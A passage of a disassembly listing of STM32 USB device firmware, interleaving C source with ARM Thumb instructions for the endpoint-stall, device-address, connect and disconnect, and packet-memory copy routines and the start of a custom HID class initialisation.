 80084c4:	683b      	ldr	r3, [r7, #0]
 80084c6:	781b      	ldrb	r3, [r3, #0]
 80084c8:	009b      	lsls	r3, r3, #2
 80084ca:	441a      	add	r2, r3
 80084cc:	89fb      	ldrh	r3, [r7, #14]
 80084ce:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80084d2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80084d6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80084da:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80084de:	b29b      	uxth	r3, r3
 80084e0:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 80084e2:	683b      	ldr	r3, [r7, #0]
 80084e4:	78db      	ldrb	r3, [r3, #3]
 80084e6:	2b01      	cmp	r3, #1
 80084e8:	d06c      	beq.n	80085c4 <USB_EPClearStall+0x14e>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 80084ea:	687a      	ldr	r2, [r7, #4]
 80084ec:	683b      	ldr	r3, [r7, #0]
 80084ee:	781b      	ldrb	r3, [r3, #0]
 80084f0:	009b      	lsls	r3, r3, #2
 80084f2:	4413      	add	r3, r2
 80084f4:	881b      	ldrh	r3, [r3, #0]
 80084f6:	b29b      	uxth	r3, r3
 80084f8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80084fc:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8008500:	81bb      	strh	r3, [r7, #12]
 8008502:	89bb      	ldrh	r3, [r7, #12]
 8008504:	f083 0320 	eor.w	r3, r3, #32
 8008508:	81bb      	strh	r3, [r7, #12]
 800850a:	687a      	ldr	r2, [r7, #4]
 800850c:	683b      	ldr	r3, [r7, #0]
 800850e:	781b      	ldrb	r3, [r3, #0]
 8008510:	009b      	lsls	r3, r3, #2
 8008512:	441a      	add	r2, r3
 8008514:	89bb      	ldrh	r3, [r7, #12]
 8008516:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800851a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800851e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008522:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008526:	b29b      	uxth	r3, r3
 8008528:	8013      	strh	r3, [r2, #0]
 800852a:	e04b      	b.n	80085c4 <USB_EPClearStall+0x14e>
      }
    }
    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 800852c:	687a      	ldr	r2, [r7, #4]
 800852e:	683b      	ldr	r3, [r7, #0]
 8008530:	781b      	ldrb	r3, [r3, #0]
 8008532:	009b      	lsls	r3, r3, #2
 8008534:	4413      	add	r3, r2
 8008536:	881b      	ldrh	r3, [r3, #0]
 8008538:	82fb      	strh	r3, [r7, #22]
 800853a:	8afb      	ldrh	r3, [r7, #22]
 800853c:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8008540:	2b00      	cmp	r3, #0
 8008542:	d01b      	beq.n	800857c <USB_EPClearStall+0x106>
 8008544:	687a      	ldr	r2, [r7, #4]
 8008546:	683b      	ldr	r3, [r7, #0]
 8008548:	781b      	ldrb	r3, [r3, #0]
 800854a:	009b      	lsls	r3, r3, #2
 800854c:	4413      	add	r3, r2
 800854e:	881b      	ldrh	r3, [r3, #0]
 8008550:	b29b      	uxth	r3, r3
 8008552:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8008556:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800855a:	82bb      	strh	r3, [r7, #20]
 800855c:	687a      	ldr	r2, [r7, #4]
 800855e:	683b      	ldr	r3, [r7, #0]
 8008560:	781b      	ldrb	r3, [r3, #0]
 8008562:	009b      	lsls	r3, r3, #2
 8008564:	441a      	add	r2, r3
 8008566:	8abb      	ldrh	r3, [r7, #20]
 8008568:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800856c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008570:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8008574:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008578:	b29b      	uxth	r3, r3
 800857a:	8013      	strh	r3, [r2, #0]

      /* Configure VALID status for the Endpoint */
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 800857c:	687a      	ldr	r2, [r7, #4]
 800857e:	683b      	ldr	r3, [r7, #0]
 8008580:	781b      	ldrb	r3, [r3, #0]
 8008582:	009b      	lsls	r3, r3, #2
 8008584:	4413      	add	r3, r2
 8008586:	881b      	ldrh	r3, [r3, #0]
 8008588:	b29b      	uxth	r3, r3
 800858a:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 800858e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8008592:	827b      	strh	r3, [r7, #18]
 8008594:	8a7b      	ldrh	r3, [r7, #18]
 8008596:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 800859a:	827b      	strh	r3, [r7, #18]
 800859c:	8a7b      	ldrh	r3, [r7, #18]
 800859e:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 80085a2:	827b      	strh	r3, [r7, #18]
 80085a4:	687a      	ldr	r2, [r7, #4]
 80085a6:	683b      	ldr	r3, [r7, #0]
 80085a8:	781b      	ldrb	r3, [r3, #0]
 80085aa:	009b      	lsls	r3, r3, #2
 80085ac:	441a      	add	r2, r3
 80085ae:	8a7b      	ldrh	r3, [r7, #18]
 80085b0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80085b4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80085b8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80085bc:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80085c0:	b29b      	uxth	r3, r3
 80085c2:	8013      	strh	r3, [r2, #0]
    }
  }

  return HAL_OK;
 80085c4:	2300      	movs	r3, #0
}
 80085c6:	4618      	mov	r0, r3
 80085c8:	371c      	adds	r7, #28
 80085ca:	46bd      	mov	sp, r7
 80085cc:	f85d 7b04 	ldr.w	r7, [sp], #4
 80085d0:	4770      	bx	lr

080085d2 <USB_SetDevAddress>:
  * @param  address new device address to be assigned
  *          This parameter can be a value from 0 to 255
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_SetDevAddress(USB_TypeDef *USBx, uint8_t address)
{
 80085d2:	b480      	push	{r7}
 80085d4:	b083      	sub	sp, #12
 80085d6:	af00      	add	r7, sp, #0
 80085d8:	6078      	str	r0, [r7, #4]
 80085da:	460b      	mov	r3, r1
 80085dc:	70fb      	strb	r3, [r7, #3]
  if (address == 0U)
 80085de:	78fb      	ldrb	r3, [r7, #3]
 80085e0:	2b00      	cmp	r3, #0
 80085e2:	d103      	bne.n	80085ec <USB_SetDevAddress+0x1a>
  {
    /* set device address and enable function */
    USBx->DADDR = (uint16_t)USB_DADDR_EF;
 80085e4:	687b      	ldr	r3, [r7, #4]
 80085e6:	2280      	movs	r2, #128	; 0x80
 80085e8:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
  }

  return HAL_OK;
 80085ec:	2300      	movs	r3, #0
}
 80085ee:	4618      	mov	r0, r3
 80085f0:	370c      	adds	r7, #12
 80085f2:	46bd      	mov	sp, r7
 80085f4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80085f8:	4770      	bx	lr

080085fa <USB_DevConnect>:
  * @brief  USB_DevConnect Connect the USB device by enabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevConnect(USB_TypeDef *USBx)
{
 80085fa:	b480      	push	{r7}
 80085fc:	b083      	sub	sp, #12
 80085fe:	af00      	add	r7, sp, #0
 8008600:	6078      	str	r0, [r7, #4]
  /* Enabling DP Pull-UP bit to Connect internal PU resistor on USB DP line */
  USBx->BCDR |= (uint16_t)USB_BCDR_DPPU;
 8008602:	687b      	ldr	r3, [r7, #4]
 8008604:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 8008608:	b29b      	uxth	r3, r3
 800860a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800860e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8008612:	b29a      	uxth	r2, r3
 8008614:	687b      	ldr	r3, [r7, #4]
 8008616:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 800861a:	2300      	movs	r3, #0
}
 800861c:	4618      	mov	r0, r3
 800861e:	370c      	adds	r7, #12
 8008620:	46bd      	mov	sp, r7
 8008622:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008626:	4770      	bx	lr

08008628 <USB_DevDisconnect>:
  * @brief  USB_DevDisconnect Disconnect the USB device by disabling the pull-up/pull-down
  * @param  USBx Selected device
  * @retval HAL status
  */
HAL_StatusTypeDef  USB_DevDisconnect(USB_TypeDef *USBx)
{
 8008628:	b480      	push	{r7}
 800862a:	b083      	sub	sp, #12
 800862c:	af00      	add	r7, sp, #0
 800862e:	6078      	str	r0, [r7, #4]
  /* Disable DP Pull-Up bit to disconnect the Internal PU resistor on USB DP line */
  USBx->BCDR &= (uint16_t)(~(USB_BCDR_DPPU));
 8008630:	687b      	ldr	r3, [r7, #4]
 8008632:	f8b3 3058 	ldrh.w	r3, [r3, #88]	; 0x58
 8008636:	b29b      	uxth	r3, r3
 8008638:	f3c3 030e 	ubfx	r3, r3, #0, #15
 800863c:	b29a      	uxth	r2, r3
 800863e:	687b      	ldr	r3, [r7, #4]
 8008640:	f8a3 2058 	strh.w	r2, [r3, #88]	; 0x58

  return HAL_OK;
 8008644:	2300      	movs	r3, #0
}
 8008646:	4618      	mov	r0, r3
 8008648:	370c      	adds	r7, #12
 800864a:	46bd      	mov	sp, r7
 800864c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008650:	4770      	bx	lr

08008652 <USB_ReadInterrupts>:
  * @brief  USB_ReadInterrupts return the global USB interrupt status
  * @param  USBx Selected device
  * @retval USB Global Interrupt status
  */
uint32_t USB_ReadInterrupts(USB_TypeDef const *USBx)
{
 8008652:	b480      	push	{r7}
 8008654:	b085      	sub	sp, #20
 8008656:	af00      	add	r7, sp, #0
 8008658:	6078      	str	r0, [r7, #4]
  uint32_t tmpreg;

  tmpreg = USBx->ISTR;
 800865a:	687b      	ldr	r3, [r7, #4]
 800865c:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8008660:	b29b      	uxth	r3, r3
 8008662:	60fb      	str	r3, [r7, #12]
  return tmpreg;
 8008664:	68fb      	ldr	r3, [r7, #12]
}
 8008666:	4618      	mov	r0, r3
 8008668:	3714      	adds	r7, #20
 800866a:	46bd      	mov	sp, r7
 800866c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008670:	4770      	bx	lr

08008672 <USB_EP0_OutStart>:
  * @param  USBx Selected device
  * @param  psetup pointer to setup packet
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EP0_OutStart(USB_TypeDef *USBx, uint8_t *psetup)
{
 8008672:	b480      	push	{r7}
 8008674:	b083      	sub	sp, #12
 8008676:	af00      	add	r7, sp, #0
 8008678:	6078      	str	r0, [r7, #4]
 800867a:	6039      	str	r1, [r7, #0]
  UNUSED(psetup);
  /* NOTE : - This function is not required by USB Device FS peripheral, it is used
              only by USB OTG FS peripheral.
            - This function is added to ensure compatibility across platforms.
   */
  return HAL_OK;
 800867c:	2300      	movs	r3, #0
}
 800867e:	4618      	mov	r0, r3
 8008680:	370c      	adds	r7, #12
 8008682:	46bd      	mov	sp, r7
 8008684:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008688:	4770      	bx	lr

0800868a <USB_WritePMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_WritePMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 800868a:	b480      	push	{r7}
 800868c:	b08b      	sub	sp, #44	; 0x2c
 800868e:	af00      	add	r7, sp, #0
 8008690:	60f8      	str	r0, [r7, #12]
 8008692:	60b9      	str	r1, [r7, #8]
 8008694:	4611      	mov	r1, r2
 8008696:	461a      	mov	r2, r3
 8008698:	460b      	mov	r3, r1
 800869a:	80fb      	strh	r3, [r7, #6]
 800869c:	4613      	mov	r3, r2
 800869e:	80bb      	strh	r3, [r7, #4]
  uint32_t n = ((uint32_t)wNBytes + 1U) >> 1;
 80086a0:	88bb      	ldrh	r3, [r7, #4]
 80086a2:	3301      	adds	r3, #1
 80086a4:	085b      	lsrs	r3, r3, #1
 80086a6:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 80086a8:	68fb      	ldr	r3, [r7, #12]
 80086aa:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint16_t WrVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 80086ac:	68bb      	ldr	r3, [r7, #8]
 80086ae:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 80086b0:	88fa      	ldrh	r2, [r7, #6]
 80086b2:	697b      	ldr	r3, [r7, #20]
 80086b4:	4413      	add	r3, r2
 80086b6:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 80086ba:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 80086bc:	69bb      	ldr	r3, [r7, #24]
 80086be:	627b      	str	r3, [r7, #36]	; 0x24
 80086c0:	e01b      	b.n	80086fa <USB_WritePMA+0x70>
  {
    WrVal = pBuf[0];
 80086c2:	69fb      	ldr	r3, [r7, #28]
 80086c4:	781b      	ldrb	r3, [r3, #0]
 80086c6:	827b      	strh	r3, [r7, #18]
    WrVal |= (uint16_t)pBuf[1] << 8;
 80086c8:	69fb      	ldr	r3, [r7, #28]
 80086ca:	3301      	adds	r3, #1
 80086cc:	781b      	ldrb	r3, [r3, #0]
 80086ce:	021b      	lsls	r3, r3, #8
 80086d0:	b21a      	sxth	r2, r3
 80086d2:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 80086d6:	4313      	orrs	r3, r2
 80086d8:	b21b      	sxth	r3, r3
 80086da:	827b      	strh	r3, [r7, #18]
    *pdwVal = (WrVal & 0xFFFFU);
 80086dc:	6a3b      	ldr	r3, [r7, #32]
 80086de:	8a7a      	ldrh	r2, [r7, #18]
 80086e0:	801a      	strh	r2, [r3, #0]
    pdwVal++;
 80086e2:	6a3b      	ldr	r3, [r7, #32]
 80086e4:	3302      	adds	r3, #2
 80086e6:	623b      	str	r3, [r7, #32]

#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */

    pBuf++;
 80086e8:	69fb      	ldr	r3, [r7, #28]
 80086ea:	3301      	adds	r3, #1
 80086ec:	61fb      	str	r3, [r7, #28]
    pBuf++;
 80086ee:	69fb      	ldr	r3, [r7, #28]
 80086f0:	3301      	adds	r3, #1
 80086f2:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 80086f4:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80086f6:	3b01      	subs	r3, #1
 80086f8:	627b      	str	r3, [r7, #36]	; 0x24
 80086fa:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 80086fc:	2b00      	cmp	r3, #0
 80086fe:	d1e0      	bne.n	80086c2 <USB_WritePMA+0x38>
  }
}
 8008700:	bf00      	nop
 8008702:	bf00      	nop
 8008704:	372c      	adds	r7, #44	; 0x2c
 8008706:	46bd      	mov	sp, r7
 8008708:	f85d 7b04 	ldr.w	r7, [sp], #4
 800870c:	4770      	bx	lr

0800870e <USB_ReadPMA>:
  * @param   wPMABufAddr address into PMA.
  * @param   wNBytes no. of bytes to be copied.
  * @retval None
  */
void USB_ReadPMA(USB_TypeDef const *USBx, uint8_t *pbUsrBuf, uint16_t wPMABufAddr, uint16_t wNBytes)
{
 800870e:	b480      	push	{r7}
 8008710:	b08b      	sub	sp, #44	; 0x2c
 8008712:	af00      	add	r7, sp, #0
 8008714:	60f8      	str	r0, [r7, #12]
 8008716:	60b9      	str	r1, [r7, #8]
 8008718:	4611      	mov	r1, r2
 800871a:	461a      	mov	r2, r3
 800871c:	460b      	mov	r3, r1
 800871e:	80fb      	strh	r3, [r7, #6]
 8008720:	4613      	mov	r3, r2
 8008722:	80bb      	strh	r3, [r7, #4]
  uint32_t n = (uint32_t)wNBytes >> 1;
 8008724:	88bb      	ldrh	r3, [r7, #4]
 8008726:	085b      	lsrs	r3, r3, #1
 8008728:	b29b      	uxth	r3, r3
 800872a:	61bb      	str	r3, [r7, #24]
  uint32_t BaseAddr = (uint32_t)USBx;
 800872c:	68fb      	ldr	r3, [r7, #12]
 800872e:	617b      	str	r3, [r7, #20]
  uint32_t count;
  uint32_t RdVal;
  __IO uint16_t *pdwVal;
  uint8_t *pBuf = pbUsrBuf;
 8008730:	68bb      	ldr	r3, [r7, #8]
 8008732:	61fb      	str	r3, [r7, #28]

  pdwVal = (__IO uint16_t *)(BaseAddr + 0x400U + ((uint32_t)wPMABufAddr * PMA_ACCESS));
 8008734:	88fa      	ldrh	r2, [r7, #6]
 8008736:	697b      	ldr	r3, [r7, #20]
 8008738:	4413      	add	r3, r2
 800873a:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 800873e:	623b      	str	r3, [r7, #32]

  for (count = n; count != 0U; count--)
 8008740:	69bb      	ldr	r3, [r7, #24]
 8008742:	627b      	str	r3, [r7, #36]	; 0x24
 8008744:	e018      	b.n	8008778 <USB_ReadPMA+0x6a>
  {
    RdVal = *(__IO uint16_t *)pdwVal;
 8008746:	6a3b      	ldr	r3, [r7, #32]
 8008748:	881b      	ldrh	r3, [r3, #0]
 800874a:	b29b      	uxth	r3, r3
 800874c:	613b      	str	r3, [r7, #16]
    pdwVal++;
 800874e:	6a3b      	ldr	r3, [r7, #32]
 8008750:	3302      	adds	r3, #2
 8008752:	623b      	str	r3, [r7, #32]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 8008754:	693b      	ldr	r3, [r7, #16]
 8008756:	b2da      	uxtb	r2, r3
 8008758:	69fb      	ldr	r3, [r7, #28]
 800875a:	701a      	strb	r2, [r3, #0]
    pBuf++;
 800875c:	69fb      	ldr	r3, [r7, #28]
 800875e:	3301      	adds	r3, #1
 8008760:	61fb      	str	r3, [r7, #28]
    *pBuf = (uint8_t)((RdVal >> 8) & 0xFFU);
 8008762:	693b      	ldr	r3, [r7, #16]
 8008764:	0a1b      	lsrs	r3, r3, #8
 8008766:	b2da      	uxtb	r2, r3
 8008768:	69fb      	ldr	r3, [r7, #28]
 800876a:	701a      	strb	r2, [r3, #0]
    pBuf++;
 800876c:	69fb      	ldr	r3, [r7, #28]
 800876e:	3301      	adds	r3, #1
 8008770:	61fb      	str	r3, [r7, #28]
  for (count = n; count != 0U; count--)
 8008772:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8008774:	3b01      	subs	r3, #1
 8008776:	627b      	str	r3, [r7, #36]	; 0x24
 8008778:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800877a:	2b00      	cmp	r3, #0
 800877c:	d1e3      	bne.n	8008746 <USB_ReadPMA+0x38>
#if PMA_ACCESS > 1U
    pdwVal++;
#endif /* PMA_ACCESS */
  }

  if ((wNBytes % 2U) != 0U)
 800877e:	88bb      	ldrh	r3, [r7, #4]
 8008780:	f003 0301 	and.w	r3, r3, #1
 8008784:	b29b      	uxth	r3, r3
 8008786:	2b00      	cmp	r3, #0
 8008788:	d007      	beq.n	800879a <USB_ReadPMA+0x8c>
  {
    RdVal = *pdwVal;
 800878a:	6a3b      	ldr	r3, [r7, #32]
 800878c:	881b      	ldrh	r3, [r3, #0]
 800878e:	b29b      	uxth	r3, r3
 8008790:	613b      	str	r3, [r7, #16]
    *pBuf = (uint8_t)((RdVal >> 0) & 0xFFU);
 8008792:	693b      	ldr	r3, [r7, #16]
 8008794:	b2da      	uxtb	r2, r3
 8008796:	69fb      	ldr	r3, [r7, #28]
 8008798:	701a      	strb	r2, [r3, #0]
  }
}
 800879a:	bf00      	nop
 800879c:	372c      	adds	r7, #44	; 0x2c
 800879e:	46bd      	mov	sp, r7
 80087a0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80087a4:	4770      	bx	lr
	...

080087a8 <USBD_CUSTOM_HID_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: Configuration index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 80087a8:	b580      	push	{r7, lr}
 80087aa:	b084      	sub	sp, #16
 80087ac:	af00      	add	r7, sp, #0
 80087ae:	6078      	str	r0, [r7, #4]
 80087b0:	460b      	mov	r3, r1
 80087b2:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)USBD_malloc(sizeof(USBD_CUSTOM_HID_HandleTypeDef));
 80087b4:	2024      	movs	r0, #36	; 0x24
 80087b6:	f004 fd05 	bl	800d1c4 <USBD_static_malloc>
 80087ba:	60f8      	str	r0, [r7, #12]

  if (hhid == NULL)
 80087bc:	68fb      	ldr	r3, [r7, #12]
 80087be:	2b00      	cmp	r3, #0
 80087c0:	d109      	bne.n	80087d6 <USBD_CUSTOM_HID_Init+0x2e>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 80087c2:	687b      	ldr	r3, [r7, #4]
 80087c4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80087c8:	687b      	ldr	r3, [r7, #4]
 80087ca:	32b0      	adds	r2, #176	; 0xb0
 80087cc:	2100      	movs	r1, #0
 80087ce:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 80087d2:	2302      	movs	r3, #2
 80087d4:	e08b      	b.n	80088ee <USBD_CUSTOM_HID_Init+0x146>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hhid;
 80087d6:	687b      	ldr	r3, [r7, #4]
 80087d8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80087dc:	687b      	ldr	r3, [r7, #4]
 80087de:	32b0      	adds	r2, #176	; 0xb0
 80087e0:	68f9      	ldr	r1, [r7, #12]
 80087e2:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 80087e6:	687b      	ldr	r3, [r7, #4]
 80087e8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80087ec:	687b      	ldr	r3, [r7, #4]
 80087ee:	32b0      	adds	r2, #176	; 0xb0
 80087f0:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 80087f4:	687b      	ldr	r3, [r7, #4]
 80087f6:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 80087fa:	687b      	ldr	r3, [r7, #4]
 80087fc:	7c1b      	ldrb	r3, [r3, #16]
 80087fe:	2b00      	cmp	r3, #0
 8008800:	d11b      	bne.n	800883a <USBD_CUSTOM_HID_Init+0x92>
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008802:	4b3d      	ldr	r3, [pc, #244]	; (80088f8 <USBD_CUSTOM_HID_Init+0x150>)
 8008804:	781b      	ldrb	r3, [r3, #0]
 8008806:	f003 020f 	and.w	r2, r3, #15
 800880a:	6879      	ldr	r1, [r7, #4]
 800880c:	4613      	mov	r3, r2
 800880e:	009b      	lsls	r3, r3, #2
 8008810:	4413      	add	r3, r2
 8008812:	009b      	lsls	r3, r3, #2
 8008814:	440b      	add	r3, r1
 8008816:	3326      	adds	r3, #38	; 0x26
 8008818:	2205      	movs	r2, #5
 800881a:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_HS_BINTERVAL;
 800881c:	4b37      	ldr	r3, [pc, #220]	; (80088fc <USBD_CUSTOM_HID_Init+0x154>)
 800881e:	781b      	ldrb	r3, [r3, #0]
 8008820:	f003 020f 	and.w	r2, r3, #15
 8008824:	6879      	ldr	r1, [r7, #4]
 8008826:	4613      	mov	r3, r2
 8008828:	009b      	lsls	r3, r3, #2
 800882a:	4413      	add	r3, r2
 800882c:	009b      	lsls	r3, r3, #2
 800882e:	440b      	add	r3, r1
 8008830:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 8008834:	2205      	movs	r2, #5
 8008836:	801a      	strh	r2, [r3, #0]
 8008838:	e01a      	b.n	8008870 <USBD_CUSTOM_HID_Init+0xc8>
  }
  else   /* LOW and FULL-speed endpoints */
  {
    pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 800883a:	4b2f      	ldr	r3, [pc, #188]	; (80088f8 <USBD_CUSTOM_HID_Init+0x150>)
 800883c:	781b      	ldrb	r3, [r3, #0]
 800883e:	f003 020f 	and.w	r2, r3, #15
 8008842:	6879      	ldr	r1, [r7, #4]
 8008844:	4613      	mov	r3, r2
 8008846:	009b      	lsls	r3, r3, #2
 8008848:	4413      	add	r3, r2
 800884a:	009b      	lsls	r3, r3, #2
 800884c:	440b      	add	r3, r1
 800884e:	3326      	adds	r3, #38	; 0x26
 8008850:	2205      	movs	r2, #5
 8008852:	801a      	strh	r2, [r3, #0]
    pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008854:	4b29      	ldr	r3, [pc, #164]	; (80088fc <USBD_CUSTOM_HID_Init+0x154>)
 8008856:	781b      	ldrb	r3, [r3, #0]
 8008858:	f003 020f 	and.w	r2, r3, #15
 800885c:	6879      	ldr	r1, [r7, #4]
 800885e:	4613      	mov	r3, r2
 8008860:	009b      	lsls	r3, r3, #2
 8008862:	4413      	add	r3, r2
 8008864:	009b      	lsls	r3, r3, #2
 8008866:	440b      	add	r3, r1
 8008868:	f503 73b3 	add.w	r3, r3, #358	; 0x166
 800886c:	2205      	movs	r2, #5
 800886e:	801a      	strh	r2, [r3, #0]
  }

  /* Open EP IN */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDInEpAdd, USBD_EP_TYPE_INTR,
 8008870:	4b21      	ldr	r3, [pc, #132]	; (80088f8 <USBD_CUSTOM_HID_Init+0x150>)
 8008872:	7819      	ldrb	r1, [r3, #0]
 8008874:	2302      	movs	r3, #2
 8008876:	2203      	movs	r2, #3
 8008878:	6878      	ldr	r0, [r7, #4]
 800887a:	f004 fa6f 	bl	800cd5c <USBD_LL_OpenEP>
                       CUSTOM_HID_EPIN_SIZE);

  pdev->ep_in[CUSTOMHIDInEpAdd & 0xFU].is_used = 1U;
 800887e:	4b1e      	ldr	r3, [pc, #120]	; (80088f8 <USBD_CUSTOM_HID_Init+0x150>)
 8008880:	781b      	ldrb	r3, [r3, #0]
 8008882:	f003 020f 	and.w	r2, r3, #15
 8008886:	6879      	ldr	r1, [r7, #4]
 8008888:	4613      	mov	r3, r2
 800888a:	009b      	lsls	r3, r3, #2
 800888c:	4413      	add	r3, r2
 800888e:	009b      	lsls	r3, r3, #2
 8008890:	440b      	add	r3, r1
 8008892:	3324      	adds	r3, #36	; 0x24
 8008894:	2201      	movs	r2, #1
 8008896:	801a      	strh	r2, [r3, #0]

  /* Open EP OUT */
  (void)USBD_LL_OpenEP(pdev, CUSTOMHIDOutEpAdd, USBD_EP_TYPE_INTR,
 8008898:	4b18      	ldr	r3, [pc, #96]	; (80088fc <USBD_CUSTOM_HID_Init+0x154>)
 800889a:	7819      	ldrb	r1, [r3, #0]
 800889c:	2302      	movs	r3, #2
 800889e:	2203      	movs	r2, #3
 80088a0:	6878      	ldr	r0, [r7, #4]
 80088a2:	f004 fa5b 	bl	800cd5c <USBD_LL_OpenEP>
                       CUSTOM_HID_EPOUT_SIZE);

  pdev->ep_out[CUSTOMHIDOutEpAdd & 0xFU].is_used = 1U;
 80088a6:	4b15      	ldr	r3, [pc, #84]	; (80088fc <USBD_CUSTOM_HID_Init+0x154>)
 80088a8:	781b      	ldrb	r3, [r3, #0]
 80088aa:	f003 020f 	and.w	r2, r3, #15
 80088ae:	6879      	ldr	r1, [r7, #4]
 80088b0:	4613      	mov	r3, r2
 80088b2:	009b      	lsls	r3, r3, #2
 80088b4:	4413      	add	r3, r2
 80088b6:	009b      	lsls	r3, r3, #2
 80088b8:	440b      	add	r3, r1
 80088ba:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 80088be:	2201      	movs	r2, #1
 80088c0:	801a      	strh	r2, [r3, #0]

  hhid->state = CUSTOM_HID_IDLE;
 80088c2:	68fb      	ldr	r3, [r7, #12]
 80088c4:	2200      	movs	r2, #0
 80088c6:	f883 2020 	strb.w	r2, [r3, #32]

  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->Init();
 80088ca:	687b      	ldr	r3, [r7, #4]
 80088cc:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
